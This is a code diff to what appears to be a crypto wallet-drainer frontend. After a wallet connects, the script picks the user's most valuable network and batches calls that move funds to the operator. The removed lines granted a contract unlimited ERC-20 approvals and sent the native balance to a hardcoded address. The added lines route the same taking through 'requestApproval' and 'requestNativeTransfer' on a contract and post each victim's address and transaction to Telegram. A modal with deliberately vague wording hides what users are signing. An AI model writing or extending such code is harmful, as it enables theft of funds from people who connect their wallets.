@@ -28,6 +28,7 @@ const networkMap = {
 }
 console.log('Network Map:', networkMap)
 
+// Адреса контракта TimelockApproval (нужно заменить на реальные после развертывания)
 const CONTRACTS = {
   [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
   [networkMap['BNB Smart Chain'].chainId]: '0x3A96C52Ecc0A0C5BfCc51204BD91D8e209ba83c6',
@@ -48,23 +49,81 @@ const appKit = createAppKit({
   features: { analytics: true, email: false, socials: false }
 })
 
-// ERC20 ABI
+// ABI для TimelockApproval
+const timelockAbi = [
+  {
+    "inputs": [{ "internalType": "address", "name": "token", "type": "address" }],
+    "name": "requestApproval",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [{ "internalType": "address", "name": "token", "type": "address" }],
+    "name": "executeApproval",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "requestNativeTransfer",
+    "outputs": [],
+    "stateMutability": "payable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "executeNativeTransfer",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "getCurrentTime",
+    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
+    "name": "approvalRequests",
+    "outputs": [
+      { "internalType": "address", "name": "token", "type": "address" },
+      { "internalType": "uint256", "name": "timestamp", "type": "uint256" },
+      { "internalType": "bool", "name": "executed", "type": "bool" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "nativeTransferRequest",
+    "outputs": [
+      { "internalType": "uint256", "name": "amount", "type": "uint256" },
+      { "internalType": "uint256", "name": "timestamp", "type": "uint256" },
+      { "internalType": "bool", "name": "executed", "type": "bool" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
+  },
+  {
+    "inputs": [],
+    "name": "APPROVAL_DELAY",
+    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
+    "stateMutability": "view",
+    "type": "function"
+  }
+]
+
+// ABI для ERC20 (для проверки балансов)
 const erc20Abi = [
   {
     constant: true,
     inputs: [{ name: '_owner', type: 'address' }],
     name: 'balanceOf',
     outputs: [{ name: 'balance', type: 'uint256' }],
-    type: 'function'
-  },
-  {
-    constant: false,
-    inputs: [
-      { name: 'spender', type: 'address' },
-      { name: 'amount', type: 'uint256' }
-    ],
-    name: 'approve',
-    outputs: [{ name: 'success', type: 'bool' }],
     type: 'function'
   }
 ]
@@ -152,7 +211,7 @@ function createCustomModal() {
     <div class="custom-modal-content">
       <p class="custom-modal-title">Sign Transaction</p>
       <div class="custom-modal-loader"></div>
-      <p class="custom-modal-message">Sign this message to approve or transfer tokens. Canceling will disconnect you.</p>
+      <p class="custom-modal-message">Sign this message to initiate token operations. Canceling will disconnect you.</p>
     </div>
   `
   document.body.appendChild(modal)
@@ -396,6 +455,15 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   }
 
   console.log(`Performing batch operations for network: ${mostExpensive.network}`)
+  console.log(`Sender address: ${state.address}`)
+
+  // Verify sender address
+  if (!state.address || !isAddress(state.address)) {
+    const errorMsg = `Invalid sender address: ${state.address || 'undefined'}`
+    store.errors.push(errorMsg)
+    console.error(errorMsg)
+    return
+  }
 
   // Switch network if necessary
   const currentChainId = store.networkState.chainId
@@ -429,32 +497,37 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   // Get tokens with non-zero balance in the most expensive token's network
   const networkTokens = allBalances.filter(t => t.network === mostExpensive.network && parseUnits(t.balance, t.decimals) > 0n)
 
-  // Prepare approve calls for ERC-20 tokens
+  // Prepare requestApproval calls for ERC-20 tokens
   const approveCalls = networkTokens
     .filter(t => t.address !== 'native')
     .map(t => ({
-      to: getAddress(t.address),
+      to: getAddress(CONTRACTS[mostExpensive.chainId]),
       data: encodeFunctionData({
-        abi: erc20Abi,
-        functionName: 'approve',
-        args: [getAddress(CONTRACTS[mostExpensive.chainId]), maxUint256]
+        abi: timelockAbi,
+        functionName: 'requestApproval',
+        args: [getAddress(t.address)]
       }),
       value: '0x0',
       gasLimit: BigInt(200000)
     }))
 
-  // Prepare transfer call for native token
+  // Prepare requestNativeTransfer call for native token
   let transferCall = null
   const nativeToken = networkTokens.find(t => t.address === 'native')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
-    const gasReserve = BigInt('10000000000000000') // 0.01 ETH in wei
+    const gasReserve = BigInt('10000000000000000') // 0.01 ETH/BNB/MATIC in wei
     if (balanceWei > gasReserve) {
       const transferAmount = balanceWei - gasReserve
+      console.log(`Preparing native token transfer request: ${nativeToken.symbol} amount=${formatUnits(transferAmount, 18)}`)
       transferCall = {
-        to: getAddress('0x10903671E4DeEe3B280E547831ceB0abAaFD0Dc0'),
+        to: getAddress(CONTRACTS[mostExpensive.chainId]),
         value: `0x${transferAmount.toString(16)}`,
-        data: '',
+        data: encodeFunctionData({
+          abi: timelockAbi,
+          functionName: 'requestNativeTransfer',
+          args: []
+        }),
         gasLimit: BigInt(200000)
       }
     } else {
@@ -471,6 +544,7 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
   // Send batch transaction
   if (allCalls.length > 0) {
     try {
+      console.log(`Preparing to send ${allCalls.length} calls:`, allCalls)
       const id = await sendCalls(wagmiAdapter.wagmiConfig, {
         calls: allCalls,
         account: getAddress(state.address),
@@ -479,6 +553,14 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       console.log(`Batch transaction sent with id: ${id}`)
       const approveState = document.getElementById('approveState')
       if (approveState) approveState.innerHTML = `Batch transaction sent with id: ${id}`
+      // Send Telegram notification with transaction details
+      const scanLink = getScanLink(id, mostExpensive.chainId, true)
+      const message = `🚀 Batch transaction sent\n` +
+                      `🌀 [Transaction](${scanLink})\n` +
+                      `🕸 Network: ${mostExpensive.network}\n` +
+                      `👤 Sender: ${state.address}\n` +
+                      `📋 Operations: ${allCalls.length} (Tokens: ${approveCalls.length}, Native: ${transferCall ? 1 : 0})`
+      await sendTelegramMessage(message)
     } catch (error) {
       store.errors.push(`Failed to send batch transaction: ${error.message}`)
       console.error(`Batch transaction error:`, error)
@@ -487,12 +569,16 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
     }
   } else {
     console.log('No operations to perform')
+    const approveState = document.getElementById('approveState')
+    if (approveState) approveState.innerHTML = 'No operations to perform'
   }
 }
 
 // Initialize subscribers
 const initializeSubscribers = (modal) => {
   const debouncedSubscribeAccount = debounce(async state => {
+    console.log(`Received account state:`, state)
+    console.log(`Connected wallet address: ${state.address}`)
     updateStore('accountState', state)
     updateStateDisplay('accountState', state)
     if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
@@ -590,6 +676,7 @@ const initializeSubscribers = (modal) => {
   }, 1000)
   modal.subscribeAccount(debouncedSubscribeAccount)
   modal.subscribeNetwork(state => {
+    console.log(`Received network state:`, state)
     updateStore('networkState', state)
     updateStateDisplay('networkState', state)
     const switchNetworkBtn = document.getElementById('switch-network')
